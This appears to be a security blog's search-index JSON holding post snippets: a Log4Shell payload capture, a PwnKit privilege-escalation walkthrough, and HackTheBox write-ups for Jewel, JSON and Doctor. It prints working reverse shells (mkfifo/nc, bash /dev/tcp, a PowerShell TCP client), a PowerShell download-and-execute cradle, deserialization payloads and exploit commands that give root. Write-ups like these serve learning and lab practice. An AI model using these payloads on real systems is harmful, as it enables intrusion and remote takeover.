it?0....`........0....a.......0.....c.....Basic/Command/Base64/cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4yNTMuMTQyIDQyNDIgPi90bXAvZgo...............objectClass0...0...2.16.840.1.113730.3.4.20..#...d......Basic/Command/Base64/cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4yNTMuMTQyIDQyNDIgPi90bXAvZgo0..0..javaClassName1...foo0...javaCodeBase1...http://192.168.253.142:8888/0$..objectClass1...javaNamingReference0&quot;..javaFactory1...ExploitwXXEY4CzxK0....e.......0&quot;...B...0...2.16.840.1.113730.3.4.2Payload deliveryGET /ExploitwXXEY4CzxK.class HTTP/1.1User-Agent: Java/1.8.0_181Host: 192.168.253.142:8888Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Connection: keep-aliveHTTP/1.1 200 OKDate: Mon, 13 Dec 2021 08:01:48 GMTContent-length: 1282.......2.=...ExploitwXXEY4CzxK.....@com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet......cmd...Ljava/lang/String;...&amp;lt;init&amp;gt;...()V...java/io/IOException.. ............java/io/File.... separator..... ......./......java/lang/String......equals...(Ljava/lang/Object;)Z............/bin/sh......-c........ ........../C..!...[Ljava/lang/String;..#...java/lang/Runtime..%..getRuntime...()Ljava/lang/Runtime;..&#39;.(.&amp;amp;.)...exec..(([Ljava/lang/String;)Ljava/lang/Process;..+.,.&amp;amp;.-...printStackTrace../....0.. transform..r(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V..9com/sun/org/apache/xalan/internal/xsltc/TransletException..4...(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V...&amp;lt;clinit&amp;gt;..Srm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.253.142 4242 &amp;gt;/tmp/f..8...Code..StackMapTable..Exceptions.!..........................:...~.......M*..................Y...SY...SY....SL.......Y.. SY..&quot;SY....SL..*+...W...M,..1....&amp;lt;.D.G....;........&#39;............$J......2.3...:.................&amp;lt;.......5...2.6...:.................&amp;lt;.......5...7.....:.............9..........Now, there are many posibilities for obfuscation. Perhaps attack’s used in the wild wouldn’t be so easy to reverse enginner." }, { "title": "Local Privilege Escalation in polkit&#39;s pkexec (CVE-2021-4034)", "url": "/posts/CVE_2021_4034/", "categories": "Blogging", "tags": "CVE-2021-44228, Log4J", "date": "2021-12-25 10:33:00 +0100", "snippet": "PwnKit (CVE-2021-4034) - Local Privilege Escalation This will be a short one. It’s about local privilege escalation vulnerability (CVE-2021-4034) with public available exploit named PwnKit.Original Post: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt Polkit (formerly PolicyKit) is a component for controlling system-wide privileges in Unix-like operating systems. It provides an organized way for non-privileged processes to communicate with privileged ones. […] It is also possible to use polkit to execute commands with elevated privileges using the command pkexec followed by the command intended to be executed (with root permission).” (Wikipedia)Since pkexec is installed on almost every Linux system and pkexec almost always has SUID-bit set it means that vulnerability that is “that” trivial to exploit (…once it’s known how…) is really bad. So let’s try one of the exploits available on GitHub: https://github.com/berdav/CVE-2021-4034[luka@localhost shm]$ wget https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/pwnkit.c...Saving to: ‘pwnkit.c’100%[===================================================================================================================================================================================================&amp;gt;] 266 --.-K/s in 0s2022-01-27 07:14:47 (15.8 MB/s) - ‘pwnkit.c’ saved [266/266][luka@localhost shm]$ wget https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c...Saving to: ‘cve-2021-4034.c’100%[===================================================================================================================================================================================================&amp;gt;] 274 --.-K/s in 0s2022-01-27 07:14:51 (10.9 MB/s) - ‘cve-2021-4034.c’ saved [274/274]After having cve-2021-4034.c and pwnkit.c on the system. Root is only few commands away. (Exploit needs compilation!). Its also possible to use Makefile to make it even more easier (kudos to https://github.com/berdav).[luka@localhost shm]$ cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c[luka@localhost shm]$ cc -Wall cve-2021-4034.c -o cve-2021-4034[luka@localhost shm]$ echo &quot;module UTF-8// PWNKIT// pwnkit 1&quot; &amp;gt; gconv-modules[luka@localhost shm]$ mkdir -p GCONV_PATH=.[luka@localhost shm]$ cp /usr/bin/true GCONV_PATH=./pwnkit.so:.[luka@localhost shm]$So that’s it. Exploit is compiled and everything has been set (read about the exploit on the original page for more information how it works)[luka@localhost shm]$ whoamiluka[luka@localhost shm]$ iduid=1000(luka) gid=1000(luka) groups=1000(luka),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023[luka@localhost shm]$ ./cve-2021-4034sh-4.2# iduid=1000(luka) gid=1000(luka) euid=0(root) groups=1000(luka),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023sh-4.2# whoamirootSo that’s it. Trivial to exploit - check if your system is exploitable (if it has SUID bit set on pkexec binary).[luka@localhost shm]$ find / -perm /4000 2&amp;gt;/dev/null.../usr/bin/pkexec...…yes you can add | grep pkexec at the end" }, { "title": "Jewel", "url": "/posts/Jewel/", "categories": "HackTheBox, Linux", "tags": "Linux, Ruby, Git Abuse, Source Code Review, Google Authenticator", "date": "2021-01-11 10:33:00 +0100", "snippet": "Jewel is a medium Windows box. It’s main part is Source Code Review.ENUMERATIONNMAPLet’s start NMAP: Nmap scan report for 10.10.10.211 Host is up (0.040s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 fd:80:8b:0c:73:93:d6:30:dc:ec:83:55:7c:9f:5d:12 (RSA) | 256 61:99:05:76:54:07:92:ef:ee:34:cf:b7:3e:8a:05:c6 (ECDSA) |_ 256 7c:6d:39:ca:e7:e8:9c:53:65:f7:e2:7e:c7:17:2d:c3 (ED25519) 8000/tcp open http Apache httpd 2.4.38 |_http-generator: gitweb/2.20.1 git/2.20.1 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Apache/2.4.38 (Debian) | http-title: 10.10.10.211 Git |_Requested resource was http://10.10.10.211:8000/gitweb/ 8080/tcp open http nginx 1.14.2 (Phusion Passenger 6.0.6) | http-methods: |_ Supported Methods: HEAD POST OPTIONS |_http-server-header: nginx/1.14.2 + Phusion Passenger 6.0.6 |_http-title: BL0G! Service Info: Host: jewel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelWe can see that host’s name is jewel.htb which can be put into the /etc/hosts file. Apart from that there are two Web Services runningWebServer (manual Enum)On port 8000 there is gitweb running that isn’t vulnerable but it enables us to take a peak into the source code from the webservice running on port 8080.Checking the bd.sql there are some usernames/passwords from potential users.Bruteforcing didn’t work against rockyou.txt.Lets check the Gemfile:Checking the Versions in Gemfile of Ruby and Rails revealed that Rails are running older vulnerable version (5.2.2.1) and there is PoC already written: https://github.com/masahiro331/CVE-2020-8165https://groups.google.com/g/rubyonrails-security/c/bv6fW4S0Y1c?pli=1Checking the source code, raw user input is allowed and will be parsed…Checking the source code, vulnerable code is present in Update function. 32 def update 33 @user = User.find(params[:id]) 34 if @user &amp;amp;&amp;amp; @user == current_user 35 cache = ActiveSupport::Cache::RedisCacheStore.new(url: &quot;redis://127.0.0.1:6379/0&quot;) 36 cache.delete(&quot;username_#{session[:user_id]}&quot;) 37 @current_username = cache.fetch(&quot;username_#{session[:user_id]}&quot;, raw: true) {user_params[:username]} 38 if @user.update(user_params) 39 flash[:success] = &quot;Your account was updated successfully&quot; 40 redirect_to articles_path 41 else 42 cache.delete(&quot;username_#{session[:user_id]}&quot;) 43 render &#39;edit&#39; 44 end 45 else 46 flash[:danger] = &quot;Not authorized&quot; 47 redirect_to articles_path 48 end 49 endSo we can exploit the application running on port 8080. So let’s do that next.EXPLOITATIONRAILS (Vulnerable to RCE - CVE-2020-8165)Following exploit will be used: https://github.com/masahiro331/CVE-2020-8165We need to register, login and change the username. Fetching the request in Burp:Create payload using ruby - i used version 2.7.2 but i had to run “bundle install” first$ bundle exec rails consoleirb(main):&amp;gt; code = &#39;`bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.10/9999 0&amp;gt;&amp;amp;1&quot;`&#39;irb(main):&amp;gt; erb = ERB.allocateirb(main):&amp;gt; erb.instance_variable_set :@src, codeirb(main):&amp;gt; erb.instance_variable_set :@filename, &quot;1&quot;irb(main):&amp;gt; erb.instance_variable_set :@lineno, 1irb(main):&amp;gt; payload=Marshal.dump(ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result)irb(main):&amp;gt;irb(main):&amp;gt; puts &quot;Payload&quot;irb(main):&amp;gt; require &#39;uri&#39;irb(main):&amp;gt; puts URI.encode_www_form(payload: payload)Put the payload that was printed by the script into username. (im not sure if it is better to do this in repeater):If everything has been done correctly reverse shell should pop.PRIVILEGE ESCALATIONEnumerationAfter shell was popped. i fired up linpeas.sh. Long story short -there was interesting file found in /var/backups dump_2020-08-27.sqlTwo new hashes for bill and jennifer users will be revealed and one of that can be bruteforced (hashcat mode 3200 (bcrypt)):Bill’s credentials work with SSH.Google AuthenticatorAfter logging in with bill .google_authenticator can be found in its home directory. bill@jewel:~$ cat .google_authenticator2UQI3R52WFCLE6JTLDCSJYMJH4That string 2UQ… is a secret that is being used to issue one time password.I installed the authenticator into the chrome and the code was issued (i live in EU but if you live in other places you may need to adjust the time!)So i was able to run sudo gem open -e “/bin/sh -c /bin/sh” rdoc and get root privileges" }, { "title": "JSON", "url": "/posts/JSON/", "categories": "HackTheBox, Windows", "tags": "Windows, C, Deserialization, JSON, Reversing", "date": "2021-01-11 10:33:00 +0100", "snippet": "Doctor is a medium Windows box. It’s all about Deserialization and ReversingENUMERATIONNMAPLet’s start NMAP:Nmap scan report for 10.10.10.158Host is up (0.038s latency).Not shown: 988 closed portsPORT STATE SERVICE VERSION21/tcp open ftp FileZilla ftpd| ftp-syst: |_ SYST: UNIX emulated by FileZilla80/tcp open http Microsoft IIS httpd 8.5| http-methods: | Supported Methods: GET HEAD OPTIONS TRACE|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/8.5|_http-title: Json HTB135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn?445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds49152/tcp open unknown49153/tcp open unknown49154/tcp open unknown49155/tcp open unknown49156/tcp open unknown49157/tcp open unknown49158/tcp open unknown1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port139-TCP:V=7.91%I=7%D=2/2%Time=60192B10%P=x86_64-pc-linux-gnu%r(GetRSF:equest,5,&quot;\\x83\\0\\0\\x01\\x8f&quot;);Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 3h59m58s, deviation: 0s, median: 3h59m58s| nbstat: NetBIOS name: JSON, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 00:50:56:b9:9a:4e (VMware)| Names:| JSON&amp;lt;00&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| WORKGROUP&amp;lt;00&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;|_ JSON&amp;lt;20&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2021-02-02T14:36:58|_ start_date: 2021-02-01T23:13:44Read data files from: /usr/bin/../share/nmapService detection performed. Please report anyIntersting ports are 21 ,80 and SMB on 139+445. There was nothing found using ftp anonymous login or checking SMB with SMBMAP/SMBCLIENT so let’s concentrate on WebServer. (i always run nikto -h and gobuster dir commands, but if nothing special was found i don’t paste that in here.)WebServer (Manual enum)Page loads very slow but in the end it redirects us to login:Credentials admin:admin work (placeholder is misleading ;-) )Two things happen then. If you pay attention to requests being issued, one of them will be sent to /api/Account. Otherwise lets call gobuster for the rescue (either search in folders or recursive) luka@kali:~$ gobuster dir -u http://10.10.10.158/api/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -k =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.158/api/ [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2021/02/02 11:34:17 Starting gobuster =============================================================== /account (Status: 401) /Account (Status: 401)Checking request to /api/Account shows that there are two identical headers being sent which is weird. Bearer header is pretty much the same but it seems more specific to DotNet i assume: https://swagger.io/docs/specification/authentication/bearer-authentication/EXPLOITATIONJSON DeserializationIf we modify the Bearer header (i did decode from b64, add {} and encode again to b64) we should get an error.Error stats that it cannot deserialize Json.Net - so there we have it. We are dealing with serialization and DotNetFrom here on i switched to my Windows VM from kali. Following will be used as payload (encoded to b64 with Windows). It is just download reverse shell to memory and execute - nothing wild. [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(&quot;iex(New-Object Net.Webclient).DownloadString(&#39;http://10.10.14.10/rev.ps1&#39;);rev.ps1;&quot;))This is reverse shell that will be used:luka@kali:~/htb/json$ cat rev.ps1 $client = New-Object System.Net.Sockets.TCPClient(&quot;10.10.14.10&quot;,4455);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&amp;gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()Output will be put in the ysoserial.exe with ObjectDataProvider gadget.PS C:\\tools_old\\ysoserial\\Release&amp;gt; .\\ysoserial.exe -g ObjectDataProvider -f json.net -c &quot;powershell -ep bypass -encoded aQBlAHgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAMAAvAHIAZQB2AC4AcABzADEAJwApADsAcgBlAHYALgBwAHMAMQA7AA==&quot; -o base64ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIHBvd2Vyc2hlbGwgLWVwIGJ5cGFzcyAtZW5jb2RlZCBhUUJsQUhnQUtBQk9BR1VBZHdBdEFFOEFZZ0JxQUdVQVl3QjBBQ0FBVGdCbEFIUUFMZ0JYQUdVQVlnQmpBR3dBYVFCbEFHNEFkQUFwQUM0QVJBQnZBSGNBYmdCc0FHOEFZUUJrQUZNQWRBQnlBR2tBYmdCbkFDZ0FKd0JvQUhRQWRBQndBRG9BTHdBdkFERUFNQUF1QURFQU1BQXVBREVBTkFBdUFERUFNQUF2QUhJQVpRQjJBQzRBY0FCekFERUFKd0FwQURzQWNnQmxBSFlBTGdCd0FITUFNUUE3QUE9PSddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9Before swapping that in Bearer header and sending the request start the nc listener. luka@kali:~/htb/json$ sudo python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.10.158 - - [02/Feb/2021 13:07:52] &quot;GET /rev.ps1 HTTP/1.1&quot; 200 -Shell was popped or it should pop if YOU are following the steps.PRIVILEGE ESCALATIONReversing / debuggingIn Program Files there is Sync2Ftp which can be downloaded in order to debug itConfig file is not readable.Checking the file in dnspy there is a class that encrypt and decrypt input from that config file. I opened the Program class and just modified it to open window box with username and password before ServiceBase will be run. using System; using System.ServiceProcess; using System.Windows.Forms; using System.Configuration; namespace SyncLocation { // Token: 0x02000005 RID: 5 internal static partial class Program { // Token: 0x0600000F RID: 15 private static void Main() { string path = ConfigurationManager.AppSettings[&quot;destinationFolder&quot;]; string text = ConfigurationManager.AppSettings[&quot;sourcefolder&quot;]; string cipherString3 = ConfigurationManager.AppSettings[&quot;user&quot;]; string cipherString2 = ConfigurationManager.AppSettings[&quot;password&quot;]; string userName = Crypto.Decrypt(cipherString3, true); string password = Crypto.Decrypt(cipherString2, true); MessageBox.Show(userName + &quot; &quot; + password); ServiceBase.Run(new ServiceBase[] { new Service1() }); } } }Username supername and password:Superadmin belongs to administrators group so there we have it!" }, { "title": "Doctor", "url": "/posts/Doctor/", "categories": "HackTheBox, Linux", "tags": "Linux, Command Injection, Path Traversal, Splunk, ADM Group", "date": "2021-01-11 10:33:00 +0100", "snippet": "Doctor is an easy linux box where we need to exploit WebApp using Command Injection, Path TraversalENUMERATIONNMAPNmap scan report for 10.10.10.209Host is up (0.040s latency).Not shown: 997 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)| 256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)|_ 256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))| http-methods: |_ Supported Methods: HEAD GET POST OPTIONS|_http-title: Doctor8089/tcp open ssl/http Splunkd httpd| http-methods: |_ Supported Methods: GET HEAD OPTIONS| http-robots.txt: 1 disallowed entry |_/|_http-title: splunkd| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2020-09-06T15:57:27| Not valid after: 2023-09-06T15:57:27| MD5: db23 4e5c 546d 8895 0f5f 8f42 5e90 6787|_SHA-1: 7ec9 1bb7 343f f7f6 bdd7 d015 d720 6f6f 19e2 098bService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWebServer/VHOST Port 80 (manual - no tools)Checking the webserver an Email info@doctors.htb was found therefore the domain doctors.htb was put into /etc/hosts. Nothing else was found.GOBUSTERGobuster was able to find few pages.WebServer/VHOST Port 8089 - splunkd (manual - no tools)It shows splunk tools but they need a login.EXPLOITATIONRegistering on doctors.htbAfter putting doctors.htb to /etc/hosts and visiting it, page automatically redirects to login portal where we can login or/and register. So let’s register:Path Traversal (no exploitation)We can view other users posts but it is nothing thereCommand InjectionApparently creating posts executes command that are inserted into the content - only caveat is that we have to avoid bad characters - spaces and double quotes (“). Content can be also viewed in /archiveShell has been poppedPRIVILEGE ESCALATIONMember of ADM group Being member of ADM group makes it possible to read logs. Apparently password was typed into wrong field (email). (Password was found by grepping password in apache2 logs and checking results line by line. To find possible usernames to work with the password found, i’ve checked /etc/passwd and the password worked with shaun.WebServer#2 - splunkdThere is another vhost running on port 8089. It was found during initial enumeration but now it is apparent that it works as root.root 1141 0.0 0.3 77664 15944 ? Ss 15:25 0:00 [splunkd pid=1139] splunkd -p 8089 start [process-runner]After searching for a while it became clear that shaun’s credentials work for that service and there was also an exploit found (https://github.com/cnotin/SplunkWhisperer2)Running PySplunkWhisperer2_remote.py setting up credentials results in an reverse shell which also proves that that vulnerability can be exploited remotely" } ]
